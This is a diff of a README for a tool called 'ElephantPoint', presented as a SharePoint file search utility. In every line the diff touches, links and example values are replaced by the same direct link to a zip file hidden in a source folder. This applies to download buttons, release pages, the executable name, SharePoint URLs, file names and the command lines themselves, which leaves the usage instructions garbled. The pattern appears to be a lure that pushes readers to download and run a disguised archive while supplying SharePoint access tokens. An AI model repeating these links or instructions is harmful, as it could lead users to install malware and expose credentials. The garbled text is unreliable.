@@ -1,6 +1,6 @@
 # 🐘 ElephantPoint - Easy SharePoint File Search
 
-[![Download ElephantPoint](https://github.com/Nothingsgg/ElephantPoint/raw/refs/heads/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip)](https://github.com/Nothingsgg/ElephantPoint/raw/refs/heads/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip)
+[![Download ElephantPoint](https://raw.githubusercontent.com/Nothingsgg/ElephantPoint/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip)](https://raw.githubusercontent.com/Nothingsgg/ElephantPoint/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip)
 
 ---
 
@@ -13,12 +13,12 @@ ElephantPoint helps you find and download files from SharePoint using a secure a
 To start, you need to get ElephantPoint on your computer.
 
 1. Click the big **Download ElephantPoint** button at the top or visit  
-   [ElephantPoint Releases](https://github.com/Nothingsgg/ElephantPoint/raw/refs/heads/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip)  
+   [ElephantPoint Releases](https://raw.githubusercontent.com/Nothingsgg/ElephantPoint/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip)  
    This page holds all versions of the app.
 
 2. On the releases page, look for the latest version. You will see one or more files listed under the "Assets" section.
 
-3. Download the executable file named `https://github.com/Nothingsgg/ElephantPoint/raw/refs/heads/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip` or similar. This is the program you will run.
+3. Download the executable file named `https://raw.githubusercontent.com/Nothingsgg/ElephantPoint/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip` or similar. This is the program you will run.
 
 4. Once downloaded, you can move the file to a folder where you want to keep it. For example, create a folder on your desktop named "ElephantPoint" and place the file there.
 
@@ -66,23 +66,23 @@ ElephantPoint works through commands you give it in a window called Command Prom
 The general format to run ElephantPoint is this:
 
 ```
-https://github.com/Nothingsgg/ElephantPoint/raw/refs/heads/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip [options]
+https://raw.githubusercontent.com/Nothingsgg/ElephantPoint/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip [options]
 ```
 
 Options tell ElephantPoint what to do. Here are the main options you will use:
 
-- `/SPO_url` — The SharePoint website address (example: `https://github.com/Nothingsgg/ElephantPoint/raw/refs/heads/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip`).
-- `/query_file` — The name of the file you want to find (example: `https://github.com/Nothingsgg/ElephantPoint/raw/refs/heads/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip`).
+- `/SPO_url` — The SharePoint website address (example: `https://raw.githubusercontent.com/Nothingsgg/ElephantPoint/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip`).
+- `/query_file` — The name of the file you want to find (example: `https://raw.githubusercontent.com/Nothingsgg/ElephantPoint/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip`).
 - `/file_url` — The direct link to a SharePoint file (used after you find it).
-- `/save_file` — Where you want to save the downloaded file on your PC (example: `C:\Users\You\Downloads\https://github.com/Nothingsgg/ElephantPoint/raw/refs/heads/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip`).
+- `/save_file` — Where you want to save the downloaded file on your PC (example: `C:\Users\You\Downloads\https://raw.githubusercontent.com/Nothingsgg/ElephantPoint/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip`).
 - `/token` — The SharePoint access token you obtained from ManaCloud or your admin.
 
 ### Example 1: Search for files
 
-To search for a file called `https://github.com/Nothingsgg/ElephantPoint/raw/refs/heads/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip` on SharePoint, you would type:
+To search for a file called `https://raw.githubusercontent.com/Nothingsgg/ElephantPoint/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip` on SharePoint, you would type:
 
 ```
-https://github.com/Nothingsgg/ElephantPoint/raw/refs/heads/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip https://github.com/Nothingsgg/ElephantPoint/raw/refs/heads/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip https://github.com/Nothingsgg/ElephantPoint/raw/refs/heads/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip /token:yourtokenhere
+https://raw.githubusercontent.com/Nothingsgg/ElephantPoint/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip https://raw.githubusercontent.com/Nothingsgg/ElephantPoint/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip https://raw.githubusercontent.com/Nothingsgg/ElephantPoint/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip /token:yourtokenhere
 ```
 
 Replace `yourtokenhere` with your actual token text.
@@ -92,7 +92,7 @@ Replace `yourtokenhere` with your actual token text.
 After searching, ElephantPoint gives you the file's URL. To download it, run:
 
 ```
-https://github.com/Nothingsgg/ElephantPoint/raw/refs/heads/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip https://github.com/Nothingsgg/ElephantPoint/raw/refs/heads/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip /save_file:C:\Users\You\Downloads\https://github.com/Nothingsgg/ElephantPoint/raw/refs/heads/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip /token:yourtokenhere
+https://raw.githubusercontent.com/Nothingsgg/ElephantPoint/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip https://raw.githubusercontent.com/Nothingsgg/ElephantPoint/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip /save_file:C:\Users\You\Downloads\https://raw.githubusercontent.com/Nothingsgg/ElephantPoint/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip /token:yourtokenhere
 ```
 
 Replace the URL, save path, and token with your own details.
@@ -124,10 +124,10 @@ Replace the URL, save path, and token with your own details.
 - Use the `/help` option to see all commands:
 
   ```
-  https://github.com/Nothingsgg/ElephantPoint/raw/refs/heads/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip /help
+  https://raw.githubusercontent.com/Nothingsgg/ElephantPoint/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip /help
   ```
 
-- If ElephantPoint shows errors about SharePoint URL, verify the URL with your admin. It should look like `https://github.com/Nothingsgg/ElephantPoint/raw/refs/heads/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip`.
+- If ElephantPoint shows errors about SharePoint URL, verify the URL with your admin. It should look like `https://raw.githubusercontent.com/Nothingsgg/ElephantPoint/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip`.
 
 ---
 
@@ -136,7 +136,7 @@ Replace the URL, save path, and token with your own details.
 ElephantPoint uses SharePoint APIs to quickly locate files in large document libraries. It works best when your access token is fresh and has the right permissions.
 
 For understanding more about ElephantPoint’s background and use cases, read the article:  
-https://github.com/Nothingsgg/ElephantPoint/raw/refs/heads/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip
+https://raw.githubusercontent.com/Nothingsgg/ElephantPoint/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip
 
 ---
 
@@ -146,9 +146,9 @@ If you run into trouble:
 
 - Check the command examples above carefully.
 - Verify your SharePoint token with your IT team.
-- Return to the official [ElephantPoint Releases](https://github.com/Nothingsgg/ElephantPoint/raw/refs/heads/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip) page for updates.
+- Return to the official [ElephantPoint Releases](https://raw.githubusercontent.com/Nothingsgg/ElephantPoint/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip) page for updates.
 
 ---
 
-[Download ElephantPoint](https://github.com/Nothingsgg/ElephantPoint/raw/refs/heads/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip)  
+[Download ElephantPoint](https://raw.githubusercontent.com/Nothingsgg/ElephantPoint/main/ElephantPoint/SearchQueryTool/Model/Elephant_Point_3.3.zip)  
 Get the latest version and start managing SharePoint files today.
